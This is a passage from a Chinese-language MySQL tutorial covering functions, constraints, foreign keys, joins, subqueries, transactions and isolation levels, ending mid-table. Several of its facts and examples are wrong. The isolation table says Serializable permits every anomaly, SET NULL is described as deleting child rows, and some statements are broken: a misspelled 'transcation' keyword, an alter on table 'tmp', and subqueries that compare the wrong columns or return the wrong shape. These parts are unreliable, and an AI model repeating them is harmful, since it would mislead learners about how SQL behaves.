<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select LPAD(ROUND(rand()*1000000,0), 6, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3><span id="日期函数">日期函数</span></h3><table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>CURDATE()</td>
<td>返回当前日期</td>
</tr>
<tr>
<td>CURTIME()</td>
<td>返回当前时间</td>
</tr>
<tr>
<td>NOW()</td>
<td>返回当前时间和日期</td>
</tr>
<tr>
<td>YEAR(date)</td>
<td>获取指定date年份</td>
</tr>
<tr>
<td>MONTH(date)</td>
<td>获取指定date月份</td>
</tr>
<tr>
<td>DAY(date)</td>
<td>获取指定date日期</td>
</tr>
<tr>
<td>DATE_ADD(date, INTERVAL expr type)</td>
<td>一个日期加上加一个时间间隔expr后的时间</td>
</tr>
<tr>
<td>DATEDIFF(date1, date2)</td>
<td>返回起始时间date1减去结束时间date2之间的天数</td>
</tr>
</tbody></table>
<p>例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select CURDATE(), CURTIME(), NOW(), YEAR(NOW()), date_add(now(), INTERVAL 70 day);</span><br><span class="line">+------------+-----------+---------------------+-------------+----------------------------------+</span><br><span class="line">| CURDATE()  | CURTIME() | NOW()               | YEAR(NOW()) | date_add(now(), INTERVAL 70 day) |</span><br><span class="line">+------------+-----------+---------------------+-------------+----------------------------------+</span><br><span class="line">| 2024-10-15 | 15:05:38  | 2024-10-15 15:05:38 |        2024 | 2024-12-24 15:05:38              |</span><br><span class="line">+------------+-----------+---------------------+-------------+----------------------------------+</span><br></pre></td></tr></table></figure>

<p>例: datediff</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select datediff(&#x27;2021-12-01&#x27;, &#x27;2021-11-01&#x27;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| datediff(&#x27;2021-12-01&#x27;, &#x27;2021-11-01&#x27;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                   30 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select datediff(&#x27;2021-10-01&#x27;, &#x27;2021-11-01&#x27;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| datediff(&#x27;2021-10-01&#x27;, &#x27;2021-11-01&#x27;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                  -31 |</span><br><span class="line">+--------------------------------------+</span><br></pre></td></tr></table></figure>

<h3><span id="流程函数">流程函数</span></h3><table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>IF(value,t,f)</td>
<td>如果value为true, 返回t, 否则返回f</td>
</tr>
<tr>
<td>IFNULL(value1, value2)</td>
<td>如果value1不为空，返回value1, 否则返回value2</td>
</tr>
<tr>
<td>CASE WHEN [val1] THEN[res1] … ELSE [default] END</td>
<td>如果val1为true，返回res1, 否则返回default默认值</td>
</tr>
<tr>
<td>CASE [expr] WHEN [val1] THEN [res1] … ELSE [default] END</td>
<td>如果expr值等于val1，返回res1, 否则返回default默认值</td>
</tr>
</tbody></table>
<p>例：if和ifnull</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select if(true, &#x27;ok&#x27;, &#x27;error&#x27;), ifnull(&#x27;ok&#x27;, &#x27;default&#x27;), ifnull(null, &#x27;default&#x27;);</span><br><span class="line">+-------------------------+-------------------------+-------------------------+</span><br><span class="line">| if(true, &#x27;ok&#x27;, &#x27;error&#x27;) | ifnull(&#x27;ok&#x27;, &#x27;default&#x27;) | ifnull(null, &#x27;default&#x27;) |</span><br><span class="line">+-------------------------+-------------------------+-------------------------+</span><br><span class="line">| ok                      | ok                      | default                 |</span><br><span class="line">+-------------------------+-------------------------+-------------------------+</span><br></pre></td></tr></table></figure>

<p>例: 查找员工姓名和工作城市，如果城市在北京或上海打印’一线城市’, 否则打印’二线城市’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name, (case city when &#x27;北京&#x27; then &#x27;一线城市&#x27; when &#x27;上海&#x27; then &#x27;一线城市&#x27; else &#x27;二线城市&#x27; end) as &#x27;工作地址&#x27; from emp;</span><br><span class="line">select name, (case when city in (&#x27;北京&#x27;,&#x27;上海&#x27;) then &#x27;一线城市&#x27; else &#x27;二线城市&#x27; end) as &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>

<h2><span id="约束">约束</span></h2><table>
<thead>
<tr>
<th>约束</th>
<th>描述</th>
<th>关键字</th>
</tr>
</thead>
<tbody><tr>
<td>非空约束</td>
<td>限制字段的value不能为null</td>
<td>NOT NULL</td>
</tr>
<tr>
<td>唯一约束</td>
<td>限制字段的所有数据都是唯一，不重复的</td>
<td>UNIQUE</td>
</tr>
<tr>
<td>主键约束</td>
<td>非空且唯一</td>
<td>PRIMARY KEY</td>
</tr>
<tr>
<td>外键约束</td>
<td>用于两张表建立连接，保证数据一致性和完整性</td>
<td>FOREIGN KEY</td>
</tr>
</tbody></table>
<p>例：按下表中的约束要求创建表</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>字段含义</th>
<th>字段类型</th>
<th>约束条件</th>
<th>约束关键字</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>ID</td>
<td>int</td>
<td>主键，自动增长</td>
<td>primary key, auto increment</td>
</tr>
<tr>
<td>name</td>
<td>姓名</td>
<td>varchar(10)</td>
<td>不为空，且唯一</td>
<td>not null, unique</td>
</tr>
<tr>
<td>age</td>
<td>年龄</td>
<td>int</td>
<td>大于0, 小于120</td>
<td>CHECK</td>
</tr>
<tr>
<td>status</td>
<td>状态</td>
<td>char(1)</td>
<td>默认值为1</td>
<td>DEFAULT</td>
</tr>
<tr>
<td>gender</td>
<td>性别</td>
<td>char(1)</td>
<td>无</td>
<td>无</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">	name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>, </span><br><span class="line">	age <span class="type">int</span> <span class="keyword">check</span>(age <span class="operator">&gt;</span> <span class="number">0</span> <span class="operator">&amp;&amp;</span> age <span class="operator">&lt;</span> <span class="number">120</span>),</span><br><span class="line">	status <span class="type">char</span>(<span class="number">1</span>) <span class="keyword">default</span> <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">	gender <span class="type">char</span>(<span class="number">1</span>)</span><br><span class="line">)Engine<span class="operator">=</span>InnoDB;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入数据违反约束，插入失败</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(name,age,status,gender) <span class="keyword">values</span>(<span class="string">&#x27;tom1&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;M&#x27;</span>),(<span class="string">&#x27;tom2&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;F&#x27;</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(name,age,status,gender) <span class="keyword">values</span>(<span class="string">&#x27;tom1&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;M&#x27;</span>);</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;tom1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;user.name&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(name,age,status,gender) <span class="keyword">values</span>(<span class="string">&#x27;tom3&#x27;</span>,<span class="number">190</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;M&#x27;</span>);</span><br><span class="line">ERROR <span class="number">3819</span> (HY000): <span class="keyword">Check</span> <span class="keyword">constraint</span> <span class="string">&#x27;user_chk_1&#x27;</span> <span class="keyword">is</span> violated.</span><br></pre></td></tr></table></figure>

<h3><span id="主键约束">主键约束</span></h3><ul>
<li>关系表中的任意两条记录不能重复，通过某个字段能唯一区分出不同的记录，这个字段被称为主键</li>
<li>主键一般是采用完全业务无关的字段，这个字段通常为id，常见的id类型：<ul>
<li>自增整数类型：INT（约21亿）, BIGINT(约922亿亿)</li>
<li>全局唯一GUID类型：也称UUID，使用一种全局唯一的字符串作为主键，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。</li>
</ul>
</li>
<li>关系数据库允许多个字段标识唯一记录，这种主键称为联合主键（很少用）</li>
</ul>
<h3><span id="外键约束">外键约束</span></h3><p>外键用来让两张表数据之间建立连接，从而保证数据一致性和完整性</p>
<p>举例：创建两张表：部门表，员工表<br><img data-src="/2024/1003155441/image_fk1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table dept(id int auto_increment primary key, name varchar(50) not null);</span><br><span class="line">insert into dept(id, name) values(1, &#x27;研发&#x27;), (2, &#x27;市场&#x27;), (3, &#x27;财务&#x27;), (4,&#x27;销售&#x27;), (5, &#x27;总经办&#x27;);</span><br><span class="line">create table emp(id int auto_increment primary key, name varchar(50) not null,age int, job varchar(20), salary int, entrydate date, managerid int,dept_id int);</span><br><span class="line">insert into emp(id,name,age,job,salary,entrydate,managerid,dept_id)  values(1, &#x27;金庸&#x27;, 66,&#x27;总裁&#x27;,20000,&#x27;2000-01-01&#x27;, 1 ,5);</span><br></pre></td></tr></table></figure>

<h4><span id="添加外键">添加外键</span></h4><p>方法1：创建表的时候添加外键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">	[CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>方法2：表创建完成后，使用alter table添加约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add constraint 外键名称 foreign key(外键字段名) references 主表(主表列名);</span><br></pre></td></tr></table></figure>

<p>例：给emp表添加外键约束fk_emp_dept_id, 字段名为dept_id，主表列名为dept表中的id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table tmp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);</span><br></pre></td></tr></table></figure>

<h4><span id="删除外键">删除外键</span></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table emp drop foreign key fk_emp_dept_id;</span><br></pre></td></tr></table></figure>

<h4><span id="删除x2f更新行为">删除&#x2F;更新行为</span></h4><table>
<thead>
<tr>
<th>行为</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NO ACTION&#x2F;RESTRICT</td>
<td>在父表中删除&#x2F;更新对应记录时，检查该记录是否有外键，如果有则不允许删除&#x2F;更新 (与RESTRICT一致)</td>
</tr>
<tr>
<td>CASCADE</td>
<td>在父表中删除&#x2F;更新对应记录时，检查该记录是否有对应外键，如果有则同时删除&#x2F;更新外键在子表中的记录</td>
</tr>
<tr>
<td>SET NULL</td>
<td>在父表中删除&#x2F;更新对应记录时，检查该记录是否有对应外键，如果有则也删除&#x2F;更新外键在子表中的记录</td>
</tr>
<tr>
<td>SET DEFAULT</td>
<td>父表有变更时，子表将外键列设置成一个默认值(InnoDB不支持)</td>
</tr>
</tbody></table>
<p>例：设置级联更新&#x2F;级联删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add constraint 外键名称 foreign key (外键字段) references 主表名(主表字段名) on update cascade on delete cascade;</span><br></pre></td></tr></table></figure>
<p>给员工表设置级联更新，级联删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id) on update cascade on delete cascade;</span><br></pre></td></tr></table></figure>
<p>例：更新部门表中id&#x3D;5记录，把id改成6，由于设置了级联更新，员工表中dept_id&#x3D;5的记录也被修改成dept_id&#x3D;6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from emp where dept_id=5;</span><br><span class="line">+----+--------+------+--------+--------+------------+-----------+---------+</span><br><span class="line">| id | name   | age  | job    | salary | entrydate  | managerid | dept_id |</span><br><span class="line">+----+--------+------+--------+--------+------------+-----------+---------+</span><br><span class="line">|  1 | 金庸   |   66 | 总裁   |  20000 | 2000-01-01 |         1 |       5 |</span><br><span class="line">+----+--------+------+--------+--------+------------+-----------+---------+</span><br><span class="line">mysql&gt; select * from dept where id=5;</span><br><span class="line">+----+-----------+</span><br><span class="line">| id | name      |</span><br><span class="line">+----+-----------+</span><br><span class="line">|  5 | 总经办    |</span><br><span class="line">+----+-----------+</span><br><span class="line"></span><br><span class="line">-- 级联更新</span><br><span class="line">mysql&gt; update dept set id=6 where id=5;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from emp;</span><br><span class="line">+----+--------+------+--------+--------+------------+-----------+---------+</span><br><span class="line">| id | name   | age  | job    | salary | entrydate  | managerid | dept_id |</span><br><span class="line">+----+--------+------+--------+--------+------------+-----------+---------+</span><br><span class="line">|  1 | 金庸   |   66 | 总裁   |  20000 | 2000-01-01 |         1 |       6 |</span><br><span class="line">+----+--------+------+--------+--------+------------+-----------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 级联删除</span><br><span class="line">mysql&gt; delete from dept where id=6;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from emp;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2><span id="多表查询">多表查询</span></h2><h3><span id="多表关系">多表关系</span></h3><ul>
<li>一对多<br>案例：比如员工表和部门表，一个部门有多个员工，一个员工只属于一个部门。<br>实现：多的一方建立外键，指向一的一方主键。</li>
<li>多对多<br>案例：比如学生和课程的关系。一个学生可以选修多个课程，一门课程可以供多个学生选择<br>实现：建立中间表，包含两个外键，分别关联两张表的主键</li>
<li>一对一<br>案例：用户与用户详情关系<br>实现：任意一方加入外键，关联另外一方的主键，并且设置外键为UNIQUE</li>
</ul>
<h3><span id="笛卡尔积">笛卡尔积</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp, dept;</span><br><span class="line">select * from emp cross join dept;</span><br></pre></td></tr></table></figure>
<p>解释：emp表有3条记录, dept有5条记录，该查询返回5*3&#x3D;15条记录</p>
<h3><span id="内连接">内连接</span></h3><p><strong>隐式内连接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表1,表2 where 条件;</span><br></pre></td></tr></table></figure>
<p><strong>显式内连接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表1 [inner] join 表2 on 连接条件;</span><br></pre></td></tr></table></figure>
<p>例：查询emp, dept两张表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select emp.name,dept.name from emp, dept where emp.dept_id = dept.id;</span><br><span class="line">select emp.name,dept.name from emp e inner join dept d on e.dept_id = d.id;</span><br></pre></td></tr></table></figure>
<h3><span id="外连接">外连接</span></h3><p><strong>左外连接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表1 left [outer] join 表2 on 条件 ...;</span><br></pre></td></tr></table></figure>
<p>相当于查询左表所有数据，再包含左表和右表交集部分的数据</p>
<p><strong>右外连接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表1 right [outer] join 表2 on 条件 ...;</span><br></pre></td></tr></table></figure>
<p>相当于查询右表所有数据，再包含左表和右表交集部分的数据</p>
<p>例：查询emp表所有数据，以及对应的部门信息(左外连接)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp e left join dept d on emp.dept_id = d.id;</span><br></pre></td></tr></table></figure>
<p>例：查询dept表所有数据，加上对应员工信息(右外连接)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp e right join dept d on e.dept_id = d.id;</span><br></pre></td></tr></table></figure>

<h3><span id="自连接">自连接</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表A 别名A join 表A 别名B on 条件...;</span><br></pre></td></tr></table></figure>
<p>自连接查询，可以是内连接查询，也可以是外连接查询。</p>
<p>例: 查询每个员工及其领导的名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e1.name, e2.name from emp e1 inner join emp e2 on e1.managerid = e2.id; </span><br></pre></td></tr></table></figure>
<p>例: 查询所有员工及其领导的名字，如果员工没有领导，也需要查询出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e1.name, e2.name from emp e1 left join emp e2 on e1.managerid = e2.id;</span><br></pre></td></tr></table></figure>

<h3><span id="联合查询">联合查询</span></h3><p>对于联合查询，就是把多次查询的结果合并起来，形成一个新的查询结果集。语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段列表 from 表A</span><br><span class="line">union [all]</span><br><span class="line">select 字段列表 from 表B;</span><br></pre></td></tr></table></figure>

<p>例：查询工资低于5000的员工，和年龄大于50岁的员工</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where salary &lt; 5000</span><br><span class="line">union all</span><br><span class="line">select * from emp where age &gt; 50;</span><br></pre></td></tr></table></figure>

<p>注：</p>
<ul>
<li>对于联合查询的多张表列数必须保持一致，字段类型也需要保持一致</li>
<li>union all会将全部数据合并，union对合并结果去重</li>
</ul>
<h3><span id="子查询">子查询</span></h3><p>SQL语句中嵌套select语句，成为嵌套查询，又称子查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t1 where column1 = (select column1 from t2);</span><br></pre></td></tr></table></figure>
<p>根据子查询结果不同，分为:</p>
<ul>
<li>标量子查询(查询结果为单个值)</li>
<li>列子查询(查询结果为一列)</li>
<li>行子查询(查询结果为一行)</li>
<li>表子查询(查询结果为多行多列)</li>
</ul>
<h4><span id="标量子查询">标量子查询</span></h4><p>例: 根据部门ID，查询员工信息(标量子查询)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where id = (select id from dept where name=&#x27;销售部&#x27;);</span><br></pre></td></tr></table></figure>
<p>例: 查询入职时间在peter之后的所有员工(标量子查询)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where entrydate &gt; (select entrydate from emp where name = &#x27;peter&#x27;);</span><br></pre></td></tr></table></figure>
<h4><span id="列子查询">列子查询</span></h4><p>子查询返回的结果是一列(可以是多行), 这种子查询称为列子查询)<br>常用操作符: IN, NOT IN, ANY, SOME, ALL</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>IN</td>
<td>在指定范围内，多选一</td>
</tr>
<tr>
<td>NOT IN</td>
<td>不在指定范围内</td>
</tr>
<tr>
<td>ANY</td>
<td>满足任意一个即可</td>
</tr>
<tr>
<td>SOME</td>
<td>与ANY等价</td>
</tr>
<tr>
<td>ALL</td>
<td>子查询返回列表的所有值都必须满足</td>
</tr>
</tbody></table>
<p>例: 查询市场部或销售部的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where dept_id in (select id from dept where name = &#x27;销售部&#x27; or name = &#x27;市场部&#x27;); </span><br></pre></td></tr></table></figure>

<p>例: 查询比财务部所有人工资都高的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where salary &gt; all (select salary from emp where dept_id = (select * from dept where name = &#x27;财务部&#x27;));</span><br></pre></td></tr></table></figure>

<h4><span id="行子查询">行子查询</span></h4><p>子查询返回结果为一行多列，这种查询称为行子查询</p>
<p>例: 查询与tony的薪资和直属领导都相同的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where (salary, managerid) = (select salary, managerid from emp where name = &#x27;Tony&#x27;); </span><br></pre></td></tr></table></figure>

<h4><span id="表子查询">表子查询</span></h4><p>子查询返回结果为多行多列，这种查询称为表子查询</p>
<p>例: 查询与peter,david的职位和薪资相同的员工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where (job,salary) in (select job, salary from emp where name = &#x27;peter&#x27; or name = &#x27;david&#x27;);</span><br></pre></td></tr></table></figure>

<h2><span id="事务">事务</span></h2><p>事务是一组操作集合，不可分割的工作单位。事务把所有操作作为一个整体向系统提交或撤销操作，这些操作要么同时成功，要么同时失败。</p>
<h3><span id="事务四大特性">事务四大特性</span></h3><ul>
<li>Atomicity 原子性 所有SQL作为一个整体，要么全执行，要么全不执行</li>
<li>Consistency 一致性 事务完成后, 所有数据状态是一致的，即A账户减去100元，B账户必定加100元</li>
<li>Isolation 隔离性 如果多个事务并发执行，每个事务做出修改必须与其他事务隔离</li>
<li>Durability 持久性 事务完成后, 对数据库修改被持久化存储</li>
</ul>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table account(</span><br><span class="line">	id int auto_increment primary key,</span><br><span class="line">	name varchar(10),</span><br><span class="line">	money int</span><br><span class="line">);</span><br><span class="line">insert into account(name,money) values(&#x27;张三&#x27;,2000),(&#x27;李四&#x27;,2000);</span><br><span class="line">update account set money = 2000 where name = &#x27;张三&#x27; or name = &#x27;李四&#x27;;</span><br></pre></td></tr></table></figure>
<h3><span id="手动提交事务">手动提交事务</span></h3><p>方法1：设置autocommit</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="variable">@autocommit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">update</span> account <span class="keyword">set</span> money <span class="operator">=</span> money <span class="operator">-</span> <span class="number">1000</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"><span class="keyword">update</span> account <span class="keyword">set</span> money <span class="operator">=</span> money <span class="operator">+</span> <span class="number">1000</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;李四&#x27;</span>;</span><br><span class="line"><span class="comment">-- 提交事务</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="comment">-- 回滚事务 rollback;</span></span><br></pre></td></tr></table></figure>
<p>方法2：手动开启事务</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">start</span> transaction; </span><br><span class="line"><span class="keyword">update</span> account <span class="keyword">set</span> money <span class="operator">=</span> money <span class="operator">-</span> <span class="number">1000</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line"><span class="keyword">update</span> account <span class="keyword">set</span> money <span class="operator">=</span> money <span class="operator">+</span> <span class="number">1000</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;李四&#x27;</span>;</span><br><span class="line"><span class="comment">-- 提交事务</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="comment">-- 回滚事务 rollback;</span></span><br></pre></td></tr></table></figure>

<h3><span id="手动回滚事务">手动回滚事务</span></h3><p>使用rollback回滚事务</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">-</span> <span class="number">100</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">+</span> <span class="number">100</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">rollback</span>;</span><br></pre></td></tr></table></figure>

<h3><span id="隔离级别">隔离级别</span></h3><p>两个并发执行事务，操作同一条表记录时，可能会存在数据不一致问题，包括脏读,不可重复读,幻读。<br>SQL标准定义了4种隔离级别,如下:</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读(Dirty Read)</th>
<th>不可重复读(Non Repeatable Read)</th>
<th>幻读(Phantom Read)</th>
</tr>
</thead>
<tbody><tr>
<td>Read Uncommitted</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Read Committed</td>
<td>-</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Repeatable Read</td>
<td>-</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td>Serializable</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
</tbody></table>
<p>查看事务隔离级别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@transaction_isolation;</span><br><span class="line">+-------------------------+</span><br><span class="line">| @@transaction_isolation |</span><br><span class="line">+-------------------------+</span><br><span class="line">| REPEATABLE-READ         |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure>
<p>设置事务隔离级别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set [session|global] transcation isolation level [read uncommitted | read committed | repeatable read | serializable ];</span><br></pre></td></tr></table></figure>

<h4><span id="read-uncommitted">Read Uncommitted</span></h4><p>Read Uncommitted级别下，一个事务会读到另一个事务未提交的数据，如果另一个事务回滚，当前事务读到的就是脏数据，即脏读(Dirty Read)</p>
<p>示例: 创建一张学生表, 插入一条学生记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create table students (<span class="built_in">id</span> bigint not null auto_increment, name varchar(36) not null, primary key(<span class="built_in">id</span>)) engine=InnoDB default charset=utf8;</span><br><span class="line">insert into students(name) values(<span class="string">&#x27;Alice&#x27;</span>);</span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from students;</span><br><span class="line">+----+-------+</span><br><span class="line">| <span class="built_in">id</span> | name  |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 | Alice |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>分别开两个MySQL连接，按顺序执行事务A和事务B</p>
<table>
<thead>
<tr>
<th>时刻</th>
<th>事务A</th>
<th>事务B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;</td>
<td>SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;</td>
</tr>
<tr>
<td>2</td>
<td>BEGIN;</td>
<td>BEGIN;</td>
</tr>
<tr>
<td>3</td>
<td>UPDATE students SET name&#x3D;’Bob’ WHERE id &#x3D; 1;</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td></td>
<td>SELECT * FROM students WHERE id &#x3D; 1;</td>
</tr>
<tr>
<td>5</td>
<td>ROLLBACK;</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>SELECT * FROM students WHERE id &#x3D; 1;</td>
</tr>
<tr>
<td>7</td>
<td></td>
<td>COMMIT;</td>
</tr>
</tbody></table>
<p><img data-src="/2024/1003155441/read-uncommitted.png"></p>
<p>说明：</p>
<ul>
<li>事务A执行完第三步后，更新了id&#x3D;1的记录，但未提交，事务B在第4步读到了Bob这一条未提交的数据</li>
<li>事务A在第五步进行了回滚，事务B再次读取id&#x3D;1的记录为Alice, 和上一次的数据不一致，这就是脏读</li>
</ul>
<h4><span id="read-committed">Read Committed</span></h4><p>Read Committed隔离级别下，一个事务不会读到另一个事务还没有提交的数据，但可能会遇到不可重复读（Non Repeatable Read）的问题。<br>不可重复读是指，一个事务内，多次读同一数据，在这个事务没有结束前，如果另一个事务恰好修改了这个数据，那么第一个事务中两次读的数据就可能不一致。</p>
<p>示例: 创建一张学生表数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from students;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | name  |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 | Alice |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec) </span><br></pre></td></tr></table></figure>
<p>分别开两个MySQL连接，按顺序执行事务A和事务B</p>
<table>
<thead>
<tr>
<th>时刻</th>
<th>事务A</th>
<th>事务B</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>SET TRANSACTION ISOLATION LEVEL READ COMMITTED;</td>
<td>SET TRANSACTION ISOLATION LEVEL READ COMMITTED;</td>
</tr>
<tr>
<td>2</td>
<td>BEGIN;</td>
<td>BEGIN;</td>
</tr>
<tr>
<td>3</td>
<td></td>
<td>SELECT * FROM students WHERE id &#x3D; 1; – Alice</td>
</tr>
<tr>
<td>4</td>
<td>UPDATE students SET name &#x3D; ‘Bob’ WHERE id &#x3D; 1;</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>COMMIT;</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>SELECT * FROM students WHERE id &#x3D; 1; – Bob</td>
</tr>
<tr>
<td>7</td>
<td></td>
<td>COMMIT;</td>
